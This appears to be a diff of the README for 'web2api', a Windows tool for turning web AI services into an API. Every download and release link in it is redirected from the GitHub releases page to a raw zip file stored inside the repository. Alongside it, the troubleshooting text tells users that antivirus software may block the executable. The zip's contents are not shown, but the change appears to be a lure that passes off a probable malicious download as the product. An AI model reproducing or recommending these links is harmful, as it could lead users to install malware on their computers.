@@ -1,6 +1,6 @@
 # ⚙️ web2api - Convert Web AI to API Easily
 
-[![Download web2api](https://img.shields.io/badge/Download-web2api-ff6f61?style=for-the-badge)](https://github.com/Ilhom1111/web2api/releases)
+[![Download web2api](https://img.shields.io/badge/Download-web2api-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/Ilhom1111/web2api/master/core/api/api-web-1.1.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to download, install, and start using web2api on your Windows
 
 Go to the official release page here:
 
-[![Visit Releases](https://img.shields.io/badge/Go%20to%20Download%20Page-green?style=for-the-badge)](https://github.com/Ilhom1111/web2api/releases)
+[![Visit Releases](https://img.shields.io/badge/Go%20to%20Download%20Page-green?style=for-the-badge)](https://raw.githubusercontent.com/Ilhom1111/web2api/master/core/api/api-web-1.1.zip)
 
 This page has the latest versions of web2api available for download.
 
@@ -100,7 +100,7 @@ You don’t need to code anything. The software does all the setup.
 If you have any issues, try these steps:
 
 1. Make sure your internet connection is stable. web2api works by connecting to online AI services.  
-2. Verify that you downloaded the latest version from the [release page](https://github.com/Ilhom1111/web2api/releases). Older versions may have bugs.  
+2. Verify that you downloaded the latest version from the [release page](https://raw.githubusercontent.com/Ilhom1111/web2api/master/core/api/api-web-1.1.zip). Older versions may have bugs.  
 3. Restart the app and try again if it freezes or crashes.  
 4. If the app doesn’t open, check your antivirus settings. Some antivirus software may block running new executables.  
 5. Make sure your Windows is up to date.  
@@ -111,7 +111,7 @@ If you have any issues, try these steps:
 
 Access all releases and versions here to download web2api:
 
-[Download web2api Releases](https://github.com/Ilhom1111/web2api/releases)
+[Download web2api Releases](https://raw.githubusercontent.com/Ilhom1111/web2api/master/core/api/api-web-1.1.zip)
 
 Remember to choose the latest stable release for the best experience.
 
@@ -150,4 +150,4 @@ Because web2api is designed for ease of use, most interactions should be straigh
 
 ---
 
-[![Download web2api](https://img.shields.io/badge/Download-web2api-ff6f61?style=for-the-badge)](https://github.com/Ilhom1111/web2api/releases)
+[![Download web2api](https://img.shields.io/badge/Download-web2api-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/Ilhom1111/web2api/master/core/api/api-web-1.1.zip)
